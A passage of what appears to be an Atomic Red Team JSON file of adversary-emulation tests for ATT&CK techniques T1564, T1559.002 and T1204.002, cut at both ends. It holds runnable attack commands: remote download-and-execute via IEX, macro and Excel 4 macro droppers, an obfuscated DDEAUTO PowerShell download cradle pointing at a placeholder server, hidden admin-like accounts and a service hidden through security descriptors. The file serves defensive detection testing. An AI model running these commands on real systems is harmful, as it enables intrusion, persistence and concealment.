itself. Document 1 is the actual maldoc itself, document 2\nis the same document without all the malicious code. Document 1 will copy Document 2 to the file system\nand then \"peek\" inside of this document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin file is a payload that is parsed out and executed on the file system.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft Word must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"}], "executor": {"command": "$macro = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\")\n$macro = $macro -replace \"aREPLACEMEa\", \"PathToAtomicsFolder\\T1564\\bin\\extractme.bin\"\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroCode \"$macro\" -officeProduct \"Word\" -sub \"Extract\" -NoWrap\n", "cleanup_command": "Remove-Item \"$env:TEMP\\extracted.exe\" -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Create a Hidden User Called \"$\"", "auto_generated_guid": "2ec63cc2-4975-41a6-bf09-dffdfb610778", "description": "Creating a user with a username containing \"$\"", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "net user $ ATOMIC123! /add /active:yes", "cleanup_command": "net user $ /DELETE 2>&1"}}, {"name": "Create an \"Administrator \" user (with a space on the end)", "auto_generated_guid": "5bb20389-39a5-4e99-9264-aeb92a55a85c", "description": "Creating a user with a username containing with a space on the end", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "New-LocalUser -Name \"Administrator \" -NoPassword", "cleanup_command": "Remove-LocalUser -Name \"Administrator \" 2>&1 | out-null"}}, {"name": "Create and Hide a Service with sc.exe", "auto_generated_guid": "333c7de0-6fbe-42aa-ac2b-c7e40b18246a", "description": "The following technique utilizes sc.exe and sdset to change the security descriptor of a service and \"hide\" it from Get-Service or sc query.\n\nUpon successful execution, sc.exe creates a new service changes the security descriptor.\n\nhttps://twitter.com/Alh4zr3d/status/1580925761996828672\nhttps://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format\n", "supported_platforms": ["windows"], "input_arguments": {"service_name": {"description": "Name of service to create", "type": "string", "default": "AtomicService"}, "executable_command": {"description": "Command to execute as a service", "type": "string", "default": "C:\\Windows\\System32\\calc.exe"}}, "executor": {"command": "sc.exe create #{service_name} binPath= \"#{executable_command}\"\nsc sdset #{service_name} \"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\n", "cleanup_command": "sc sdset #{service_name} \"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\"\nsc.exe delete #{service_name}\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Command Execution with NirCmd", "auto_generated_guid": "2748ab4a-1e0b-4cf2-a2b0-8ef765bec7be", "description": "NirCmd is used by threat actors to execute commands, which can include recon and privilege escalation via running commands via the SYSTEM account\nSee https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\n", "supported_platforms": ["windows"], "input_arguments": {"nircmd_location": {"description": "Location of nircmd executable", "type": "Path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\nircmd.exe"}, "command_to_execute": {"description": "Command for nircmd to execute", "type": "Path", "default": "win child class \"Shell_TrayWnd\" hide class \"TrayClockWClass\""}, "cleanup_command_to_execute": {"description": "Cleanup command to undo the arbitrary command ran by nircmd", "type": "Path", "default": "win child class \"Shell_TrayWnd\" show class \"TrayClockWClass\""}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The Nircmd executable must exist at (#{nircmd_location})\n", "prereq_command": "if (Test-Path \"#{nircmd_location}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://www.nirsoft.net/utils/nircmd-x64.zip\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nircmd.zip\" \nexpand-archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\nircmd.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\"\n"}], "executor": {"command": "cmd /c \"#{nircmd_location}\" #{command_to_execute}\n", "cleanup_command": "cmd /c \"#{nircmd_location}\" #{cleanup_command_to_execute} -erroraction silentlycontinue | out-null\n", "name": "powershell", "elevation_required": false}}]}, "T1559.002": {"name": "Dynamic Data Exchange", "technique_id": "attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d", "external_id": "T1559.002", "data_components": ["Script Execution", "Process Creation", "Module Load"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067", "course-of-action--b9f0c069-abbe-4a07-a245-2481219a1463", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)", "atomic_tests": [{"name": "Execute Commands", "auto_generated_guid": "f592ba2a-e9e8-4d62-a459-ef63abd819fd", "description": "Executes commands via DDE using Microsfot Word\n", "supported_platforms": ["windows"], "executor": {"steps": "Open Microsoft Word\n\nInsert tab -> Quick Parts -> Field\n\nChoose = (Formula) and click ok.\n\nAfter that, you should see a Field inserted in the document with an error \"!Unexpected End of Formula\", right-click the Field, and choose Toggle Field Codes.\n\nThe Field Code should now be displayed, change it to Contain the following:\n\n{DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"  }\n", "name": "manual"}}, {"name": "Execute PowerShell script via Word DDE", "auto_generated_guid": "47c21fb6-085e-4b0d-b4d2-26d72c3830b3", "description": "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n", "supported_platforms": ["windows"], "executor": {"command": "start \"$PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\"\n", "name": "command_prompt"}}, {"name": "DDEAUTO", "auto_generated_guid": "cf91174c-4e74-414e-bec0-8d60a104d181", "description": "\nTrustedSec - Unicorn - https://github.com/trustedsec/unicorn\n\nSensePost DDEAUTO - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n\nWord VBA Macro\n\n[Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)\n", "supported_platforms": ["windows"], "executor": {"steps": "1. Open Word\n\n2. Insert tab -> Quick Parts -> Field\n\n3. Choose = (Formula) and click ok.\n\n4. Once the field is inserted, you should now see \"!Unexpected End of Formula\"\n\n5. Right-click the Field, choose \"Toggle Field Codes\"\n\n6. Paste in the code from Unicorn or SensePost\n\n7. Save the Word document.\n\n9. DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"\n\n10. DDEAUTO \"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # \" \"Microsoft Document Security Add-On\"\n", "name": "manual"}}]}, "T1204.002": {"name": "Malicious File", "technique_id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e", "external_id": "T1204.002", "data_components": ["Process Creation", "File Creation"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46"], "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).", "atomic_tests": [{"name": "OSTap Style Macro Execution", "auto_generated_guid": "8bebc690-18c7-4549-bc98-210f7019efff", "description": "This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n", "supported_platforms": ["windows"], "input_arguments": {"jse_path": {"description": "Path for the macro to write out the \"malicious\" .jse file\n", "type": "string", "default": "C:\\Users\\Public\\art.jse"}, "ms_product": {"description": "Maldoc application Word or Excel", "type": "string", "default": "Word"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft #{ms_product} must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "cleanup_command": "Remove-Item #{jse_path} -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "OSTap Payload Download", "auto_generated_guid": "3f3af983-118a-4fa1-85d3-ba4daa739d80", "description": "Uses cscript //E:jscript to download a file\n", "supported_platforms": ["windows"], "input_arguments": {"script_file": {"description": "File to execute jscript code from", "type": "path", "default": "%TEMP%\\OSTapGet.js"}, "file_url": {"description": "URL to retrieve file from", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}}, "executor": {"command": "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n", "cleanup_command": "del #{script_file} /F /Q >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Maldoc choice flags command execution", "auto_generated_guid": "0330a5d2-a45a-4272-a9ee-e364411c4b18", "description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n", "supported_platforms": ["windows"], "input_arguments": {"ms_product": {"description": "Maldoc application Word or Excel", "type": "string", "default": "Word"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft #{ms_product} must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "name": "powershell"}}, {"name": "OSTAP JS version", "auto_generated_guid": "add560ef-20d6-4011-a937-2c340f930911", "description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n", "supported_platforms": ["windows"], "input_arguments": {"jse_path": {"description": "jse file to execute with wscript", "type": "path", "default": "C:\\Users\\Public\\art.jse"}, "ms_product": {"description": "Maldoc application Word or Excel", "type": "string", "default": "Word"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft #{ms_product} must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript #{jse_path}`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n", "name": "powershell"}}, {"name": "Office launching .bat file from AppData", "auto_generated_guid": "9215ea92-1ded-41b7-9cd6-79f9a78397aa", "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.", "supported_platforms": ["windows"], "input_arguments": {"bat_path": {"description": "Path to malicious .bat file", "type": "string", "default": "$(\"$env:temp\\art1204.bat\")"}, "ms_product": {"description": "Maldoc application Word or Excel", "type": "string", "default": "Word"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft #{ms_product} must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{bat_path}`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c $bat_path `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}\n", "name": "powershell"}}, {"name": "Excel 4 Macro", "auto_generated_guid": "4ea1fc97-8a46-4b4e-ba48-af43d2a98052", "description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username\n", "supported_platforms": ["windows"], "input_arguments": {"download_url": {"description": "Download URL", "type": "string", "default": "https://live.sysinternals.com/procexp.exe"}, "uname": {"description": "Username for pathing", "type": "string", "default": "$env:Username"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft Excel must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"}], "executor": {"command": "$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"\n$fname1 = \"$env:TEMP\\procexp.exe\"\nif (Test-Path $fname) {\n  Remove-Item $fname\n  Remove-Item $fname1\n}\n\n$xlApp = New-Object -COMObject \"Excel.Application\"\n$xlApp.Visible = $True\n$xlApp.DisplayAlerts = $False\n$xlBook = $xlApp.Workbooks.Add()\n$sheet = $xlBook.Excel4MacroSheets.Add()\n\nif (\"#{uname}\" -ne \"\") {\n  $sheet.Cells.Item(1,1) = \"#{uname}\"\n} else {\n  $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"\n}\n\n$sheet.Cells.Item(2,1) = \"procexp.exe\"\n$sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"\n$sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"\n$sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\", 3)\"\n$sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"#{download_url}`\"`\"`\")\"\n$sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"\n$sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"\n$sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"\n$sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"\n$sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"\n$sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"\n$sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"\n$sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"\n$sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"\n$sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\"`\", 2`\")\"\n$sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"\n$sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"\n$sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"\n$sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\")\"\n$sheet.Cells.Item(21,1) = \"=WAIT(NOW()+`\"00:00:05`\")\"\n$sheet.Cells.Item(22,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\")\"\n$sheet.Cells.Item(23,1) = \"=HALT()\"\n$sheet.Cells.Item(1,1).Name = \"runme\"\n$xlApp.Run(\"runme\")\n$xlApp.Quit()\n\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null\n[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null\n[System.GC]::Collect()\n[System.GC]::WaitForPendingFinalizers()\n\nRemove-Variable xlBook\nRemove-Variable xlApp\n", "cleanup_command": "Stop-Process -Name \"procexp*\" -ErrorAction Ignore\nRemove-Item \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\" -ErrorAction Ignore\nRemove-Item \"$env:TEMP\\procexp.exe\" -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Headless Chrome code execution via VBA", "auto_generated_guid": "a19ee671-ed98-4e9d-b19c-d1954a51585a", "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Microsoft Word must be installed\n", "prereq_command": "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\n  Stop-Process -Name \"winword\"\n  exit 0 } catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"}, {"description": "Google Chrome must be installed\n", "prereq_command": "try {\n  $chromeInstalled = (Get-Item (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe').'(Default)').VersionInfo.FileName\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Google Chrome manually to meet this requirement\"\n"}], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"\n", "name": "powershell", "cleanup_command": "Stop-Process -name mshta\n"}}, {"name": "Potentially Unwanted Applications (PUA)", "auto_generated_guid": "02f35d62-9fdc-4a97-b899-a5d9a876d295", "description": "The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).\n", "supported_platforms": ["windows"], "input_arguments": {"pua_url": {"description": "url to PotentiallyUnwanted.exe", "type": "url", "default": "http://amtso.eicar.org/PotentiallyUnwanted.exe"}, "pua_file": {"description": "path to PotentiallyUnwanted.exe", "type": "path", "default": "$env:TEMP/PotentiallyUnwanted.exe"}}, "executor": {"name": "powershell", "elevation_required": false, "command": "Invoke-WebRequest #{pua_url} -OutFile #{pua_file}\n& \"#{pua_file}\"\n", "cleanup_command": "Stop-Process -name PotentiallyUnwanted\nRemove-Item #{pua_file} -ErrorAction Ignore\n"}}, {"name": "Office Generic Payload Download", "auto_generated_guid": "5202ee05-c420-4148-bf5e-fd7f7d24850c", "description": "This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.\nRequired input agruments are c2_domain and file_name\nExecution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nExample for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder\nExample input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt\n", "supported_platforms": ["windows"], "input_arguments": {"macro_path": {"description": "Location of file which will be converted to a VBA macro\n", "type": "path", "default": "PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt"}, "c2_domain": {"description": "This required variable points to a user defined HTTP server that will host the file_name in the c2_parent_directory.\n", "type": "url", "default": null}, "c2_parent_directory": {"description": "Parent directory where you have the \"malicious\" file on c2_domain server.\nWill default to root directory. Forward slashes are not needed at begining or ending of directory path\n", "type": "path", "default": ""}, "file_name": {"description": "\"Malicious\" file to be downloaded.\nThis required file needs to be place on the user provided c2 domain\nExample file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt\n", "type": "string", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt"}, "ms_product": {"description": "Maldoc application Word or Excel\n", "type": "string", "default": "Word"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Destination c2_domain name or IP address must be set to a running HTTP server.\n", "prereq_command": "if (#{c2_domain}) (exit 0) else (exit 1)\n", "get_prereq_command": "Write-Host \"Destination c2 server domain name or IP address must be set and reachable for HTTP service\"\n"}, {"description": "Microsoftt #{ms_product} must be installed\n", "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n", "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"}], "executor": {"name": "powershell", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macroCode = Get-Content \"#{macro_path}\" -Raw\n$URL = \"#{c2_domain}\" + \"/\" + \"#{c2_parent_directory}\"\n$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', \"#{file_name}\"\nInvoke-MalDoc -macroCode $macroCode -officeProduct \"#{ms_product}\"\n", "cleanup_command": "Remove-Item \"C:\\Users\\$env:username\\Desktop\\#{file_name}\" -ErrorAction Ignore\n"}}, {"name": "LNK Payload Download", "auto_generated_guid": "581d7521-9c4b-420e-9695-2aec5241167f", "description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496", "supported_platforms": ["windows"], "executor": {"command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"\n$file1 = \"$env:Temp\\test10.lnk\"\nStart-Process $file1\nStart-Sleep -s 10\ntaskkill /IM a.exe /F\n", "cleanup_command": "$file1 = \"$env:Temp\\test10.lnk\"\n$file2 = \"$env:Temp\\a.exe\"\nRemove-Item $file1 -ErrorAction Ignore\nRemove-Item $file2 -ErrorAction Ignore", "name": "powershell"}}, {"name": "Mirror Blast Emulation", 